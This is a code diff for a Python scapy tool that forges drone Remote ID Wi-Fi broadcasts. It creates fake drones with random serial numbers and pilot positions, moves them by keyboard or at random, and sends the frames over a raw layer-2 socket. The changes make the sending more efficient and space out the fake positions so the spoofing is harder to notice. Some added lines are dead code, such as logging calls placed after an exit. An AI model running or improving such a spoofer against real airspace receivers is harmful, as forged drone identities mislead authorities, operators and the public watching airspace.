@@ -10,8 +10,11 @@ from datetime import datetime, timedelta
 
 import scapy.layers.dot11 as scapy
 from scapy.sendrecv import sendp
+from scapy.config import conf
 
 logging.basicConfig(level=logging.NOTSET, format='%(asctime)s %(levelname)s %(message)s')
+
+
 
 DEFAULT_LAT: int = 473763399
 DEFAULT_LNG: int = 85312562
@@ -207,6 +210,9 @@ def send(packets: list[scapy.Packet], interface: str, loop: int = 0, inter: floa
     except OSError as err:
         logging.critical(f"Looks like there may be a problem with the INTERFACE. Please check the spelling of the "
                          f"name and its connection. extra: {err}")
+    except KeyboardInterrupt:
+        sys.exit(0)
+        logging.info("Script interrupted. Shutting down..")
 
 
 def spoof_controlled_drone(args: argparse.Namespace) -> None:
@@ -227,11 +233,13 @@ def spoof_controlled_drone(args: argparse.Namespace) -> None:
     tattr = termios.tcgetattr(stdin)
 
     serial = args.serial.encode() if args.serial else get_random_serial_number()
+    lat_, lng_ = random_location(lat_, lng_, step*10) # so if we spoof consectutively they dont appear too close
     direction = 0
     pilot_loc = get_random_pilot_location(lat_, lng_)
     logging.info(f"Drone with SERIAL NUMBER {serial} and LOCATION [LAT LNG] {lat_}, {lng_} created.")
     logging.info(f"Starting spoofing....\nUse W, A, S, D to move the drone.\nW (North)\nA (West)\nS (South)\nD (East)")
 
+    s = conf.L2socket(iface=args.interface)
     try:
         tty.setcbreak(sys.stdin.fileno())
         while True:
@@ -256,8 +264,11 @@ def spoof_controlled_drone(args: argparse.Namespace) -> None:
 
             if send_next < datetime.now():  # only send packets every 3 seconds
                 packet = create_packet(lat_, lng_, serial, pilot_loc, direction)
-                send(packet, args.interface)
+                s.send(packet)
+                logging.info(f"Sent {serial}")
                 send_next = datetime.now() + timedelta(seconds=seconds)
+
+        s.close()
     except KeyboardInterrupt:
         logging.info("Script interrupted. Shutting down..")
     finally:
@@ -276,50 +287,49 @@ def spoof_automatic_drones(args: argparse.Namespace) -> None:
     """
     seconds: int = args.interval
     lat_, lng_ = args.location
-    send_next = datetime.now() + timedelta(seconds=seconds)
     step = 10000
 
-    if args.random <= 1:
-        logging.info("Starting in DEFAULT MODE - spoofing one drone.")
-        serial = args.serial.encode() if args.serial else get_random_serial_number()
+    logging.info(f"Starting in RANDOM MODE - spoofing {args.random} drones.")
+    drone_list = []
+    send_next = datetime.now() + timedelta(seconds=seconds)
+
+    
+    n_drones = args.random
+    for i in range(n_drones):
+        serial = get_random_serial_number()
         pilot_loc = get_random_pilot_location(lat_, lng_)
-        logging.info(f"Drone with SERIAL NUMBER {serial} and LOCATION [LAT LNG] {lat_}, {lng_} created.")
-        try:
-            lat_i, lng_i = lat_, lng_
-            while True:
-                if send_next < datetime.now():  # only send packets every 3 seconds
-                    packet = create_packet(lat_i, lng_i, serial, pilot_loc)
-                    lat_i, lng_i = random_location(lat_i, lng_i, step)
-                    send(packet, args.interface)
-                    send_next = datetime.now() + timedelta(seconds=seconds)
-        except KeyboardInterrupt:
-            logging.info("Script interrupted. Shutting down..")
-    else:
-        logging.info(f"Starting in RANDOM MODE - spoofing {args.random} drones.")
-        drone_list = []
+        drone_list.append((serial, pilot_loc, lat_, lng_))
+        logging.info(f"Drone with SERIAL NUMBER {serial} created.")
+
+    try:
         
-        n_drones = args.random
-        for i in range(n_drones):
-            serial = get_random_serial_number()
-            pilot_loc = get_random_pilot_location(lat_, lng_)
-            drone_list.append((serial, pilot_loc, lat_, lng_))
-            logging.info(f"Drone with SERIAL NUMBER {serial} created.")
+        packet_list = []
+        for i, tup in enumerate(drone_list):
+            serial_i, pilot_loc_i, lat_prev, lng_prev = tup
+            lat_i, lng_i = random_location(lat_prev, lng_prev, step)
+            drone_list[i] = serial_i, pilot_loc_i, lat_i, lng_i
+            packet = create_packet(lat_i, lng_i, serial_i, pilot_loc_i)
+            packet_list.append(packet)
 
-        try:
-            while True:
-                if send_next < datetime.now():  # only send packets every 3 seconds
-                    packet_list = []
-                    for i, tup in enumerate(drone_list):
-                        serial_i, pilot_loc_i, lat_prev, lng_prev = tup
-                        lat_i, lng_i = random_location(lat_prev, lng_prev, step)
-                        drone_list[i] = serial_i, pilot_loc_i, lat_i, lng_i
-                        packet = create_packet(lat_i, lng_i, serial_i, pilot_loc_i)
-                        packet_list.append(packet)
+        s = conf.L2socket(iface=args.interface)
+        counter = 0
+        while True:
+            if send_next < datetime.now():  # only send packets every 3 seconds
+                i = 0
+                for p in packet_list:
+                    s.send(p)
+                    logging.info(f"Sent {drone_list[i][0]}")
+                    i +=1
+                    counter += 1
+                print("Packets sent: %i " % counter)
 
-                    send(packet_list, args.interface)
-                    send_next = datetime.now() + timedelta(seconds=seconds)
-        except KeyboardInterrupt:
-            logging.info("Script interrupted. Shutting down..")
+                send_next = datetime.now() + timedelta(seconds=seconds)
+        s.close()
+
+    except KeyboardInterrupt:
+        s.close()
+        sys.exit(0)
+        logging.info("Script interrupted. Shutting down..")
 
 
 def random_location(lat_: int, lng_: int, distance: int = 100000) -> tuple[int, int]:
@@ -346,7 +356,7 @@ def main() -> None:
     #  Setup interface
     if not args.interface:
         logging.info("No interface detected. Using default value.")
-        args.interface = "wlx00c0ca99160d"
+        args.interface = "wlan1"
     logging.info(f"Setting interface to: {args.interface}")
 
     #  Setup location, defaults to Kasernenareal
@@ -360,6 +370,10 @@ def main() -> None:
         logging.info("Starting in MANUAL MODE - spoofing one user controlled drone.")
         spoof_controlled_drone(args)
     else:
+        if args.random <1:
+            print("When using random mode (-r) the minimum value is 1")
+            sys.exit(0)
+
         spoof_automatic_drones(args)
 
 
